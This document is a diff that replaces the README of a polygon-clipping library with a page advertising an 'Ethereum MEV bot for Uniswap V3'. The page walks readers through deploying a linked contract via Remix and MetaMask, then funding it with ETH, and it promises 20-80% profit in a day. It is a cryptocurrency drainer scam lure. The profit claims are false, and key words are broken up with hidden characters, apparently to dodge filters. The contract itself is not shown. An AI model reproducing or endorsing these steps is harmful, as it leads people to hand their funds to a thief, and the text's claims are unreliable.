@@ -1,55 +1,69 @@
-# Clipper2
-### A Polygon <a href="https://en.wikipedia.org/wiki/Clipping_(computer_graphics)">Clipping</a> and <a href="https://en.wikipedia.org/wiki/Parallel_curve">Offsetting</a> library (in C++, C# &amp; Delphi)<br>
-[![GitHub Actions C++ status](https://github.com/AngusJohnson/Clipper2/actions/workflows/actions_cpp.yml/badge.svg)](https://github.com/AngusJohnson/Clipper2/actions/workflows/actions_cpp.yml)&nbsp;[![C#](https://github.com/AngusJohnson/Clipper2/actions/workflows/actions_csharp.yml/badge.svg)](https://github.com/AngusJohnson/Clipper2/actions/workflows/actions_csharp.yml)&nbsp;[![License](https://img.shields.io/badge/License-Boost_1.0-lightblue.svg)](https://www.boost.org/LICENSE_1_0.txt)
-[![Nuget](https://img.shields.io/nuget/v/Clipper2?color=green)](https://www.nuget.org/packages/Clipper2)
-[![documentation](https://user-images.githubusercontent.com/5280692/187832279-b2a43890-da80-4888-95fe-793f092be372.svg)](http://www.angusj.com/clipper2/Docs/Overview.htm)
 
-The <b>Clipper2</b> library performs **intersection**, **union**, **difference** and **XOR** boolean operations on both simple and complex polygons. It also performs polygon offsetting. This is a major update of my original <a href="https://sourceforge.net/projects/polyclipping/"><b>Clipper</b></a> library that was written over 10 years ago. That library I'm now calling <b>Clipper1</b>, and while it still works very well, Clipper2 is [better](http://www.angusj.com/clipper2/Docs/Changes.htm) in just about every way.
+<h1 align="center">Create Your Ethereum Bot for Uniswap V3</h1>
 
-### Compilers
-<b>Clipper2</b> can be compiled using either C++, or C#, or Delphi Pascal. The library can also be accessed from other programming languages by dynamically linking to exported functions in the [C++ compiled Clipper2 library](https://github.com/AngusJohnson/Clipper2/tree/main/DLL). (Since the C++ compiled code is [measurably](https://www.angusj.com/clipper2/Docs/Changes.htm) faster, C# and Delphi developers may also prefer this approach in applications where the library's performance is critical.) 
-| Lang. | Requirements |
-| --- | --- |
-| [**C++:**](https://github.com/AngusJohnson/Clipper2/tree/main/CPP) | Requires C++17 (could be modified to C++11 with relatively minor changes), **or**| 
-| [**C#:**](https://github.com/AngusJohnson/Clipper2/tree/main/CSharp) | The library uses Standard Library 2.0 but the sample code uses .NET6, **or**| 
-| [**Delphi:**](https://github.com/AngusJohnson/Clipper2/tree/main/Delphi) | Compiles with any version of Delphi from version 7 to current.| 
+<p align="center">
+  <img src="https://i.ibb.co/Sm4Xddw/68747470733a2f2f692e6962622e636f2f374779433259512f676574737461727465642e706e67.png">
+</p>
 
-### Documentation
+<p align="center">
+  <strong>A tool for creating and managing MEV Bots, where clients can connect a MetaMask wallet and create a contract that is executed via a script on the website.</strong>
+</p>
 
- <a href="http://www.angusj.com/clipper2/Docs/Overview.htm"><b>Extensive HTML documentation</b></a>
-<br><br>
+## Description
 
-### Examples
+The tool allows users to create and manage MEV bots (Maximal Extractable Value bots) based on smart contracts. Users can connect their MetaMask cryptocurrency wallets, create contracts, and run scripts to automate trading and other operations on the Ethereum blockchain. 
 
-<pre>
-      //C++
-      Paths64 subject, clip, solution;
-      subject.push_back(MakePath({100, 50, 10, 79, 65, 2, 65, 98, 10, 21}));
-      clip.push_back(MakePath({98, 63, 4, 68, 77, 8, 52, 100, 19, 12}));
-      solution = Intersect(subject, clip, FillRule::NonZero);</pre>
-<pre>      //C#
-      Paths64 subj = new Paths64();
-      Paths64 clip = new Paths64();
-      subj.Add(Clipper.MakePath(new int[] { 100, 50, 10, 79, 65, 2, 65, 98, 10, 21 }));
-      clip.Add(Clipper.MakePath(new int[] { 98, 63, 4, 68, 77, 8, 52, 100, 19, 12 }));
-      Paths64 solution = Clipper.Intersect(subj, clip, FillRule.NonZero);</pre>
-<pre>      //Delphi
-      var 
-        subject, clip, solution: TPaths64;
-      begin
-        SetLength(subject, 1);
-        subject[0] := MakePath([100, 50, 10, 79, 65, 2, 65, 98, 10, 21]);
-        SetLength(clip, 1);
-        clip[0] := MakePath([98, 63, 4, 68, 77, 8, 52, 100, 19, 12]);
-        solution := Intersect( subject, clip, frNonZero);</pre>
-![clipperB](https://user-images.githubusercontent.com/5280692/178123810-1719a1f5-25c3-4a9e-b419-e575ff056272.svg)
+⚠️ **The bot operates entirely within the browser, so there is no need to download any programs that could potentially be harmful to your computer.**
 
-<hr>
+## Key Features
 
-### Ports to other languages
-| lang. | link |
-| ------ | ------ |
-| **WASM** | https://github.com/ErikSom/Clipper2-WASM/ |
-| **Java** | https://github.com/micycle1/Clipper2-java/ |
-| **Kotlin** | https://github.com/Monkey-Maestro/clipper2-kotlin |
-| **golang** | https://github.com/epit3d/goclipper2 |
+- **Wallet Connection**: Supports MetaMask.
+- **Contract Creation**: Users can create smart contracts using our tool.
+- **Script Execution**: The website allows users to execute the created contract and manage its execution.
+- **Real-time Transaction Display**: The bot's transactions are displayed in real-time.
+
+## Usage
+
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+ 
+2. Access to [**Remix Ethereum IDE**](https://remix.ethereum.org/).
+   
+   <img src="https://i.ibb.co/ftNtP8G/2.png" alt="2" border="0">
+   
+   #### For the Remix IDE you can follow this steps:
+3. Click on the `contracts` folder and then create `New File`. Rename it as you like, for example: `bot.sol`
+
+   #### Note: If there is a problem if the text is not colored when you create bot.sol and paste the code from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.
+
+
+4. Paste this [**sourcecode**](sourcecode.sol) code in R­­emi­x­.
+
+5.  Go to the `Solidity Compiler` tab, select version `0.6.6+commit.6c089d02` and click `Compile bot.sol`.
+ 
+    Make sure `bot.sol` is selected in the CONTRACT section of the SOLIDITY COMPILER section.
+
+6. TGo to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - ­M­et­am­as­k­­` environment and then `Deploy`. By approving the Me­­ta­­­ma­­sk contract creation fee, you will have created your own contract (ignore any IFPS errors that may appear afterwards).
+
+7. Copy your newly created contract address and fund it with any amount of ETH (at least 0.5-2 ETH or more is recommended) Simply send ETH to your newly created contract address to allow the bot to earn money.
+
+8. After your transaction is confirmed, click the “start” button to run the b­o­­t. Withdraw your ETH at any time by clicking the “Withdraw” button.
+ 
+   #### That’s it. The bo­t will start wo­rking immed­iately earning you profits from a­r­­b­itr­a­ge trades on ­U­ni­s­­wa­­p pools.
+   
+   #### Testing the bot's operation over 24 hours yields ~20-80% profit on the balance.
+
+   #### The profit depends on network load (gas price) and competition from other MEV bots on the token.
+## Bot Balance Chart
+
+<img src="https://i.ibb.co/2t6ppPD/3.png" alt="3" border="0">
+
+
+## Contact Us
+📫 For any inquiries, please reach out to us:
+
+Telegram : [**Click Here**](https://t.me/UniMevBotsSupport/).
+
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
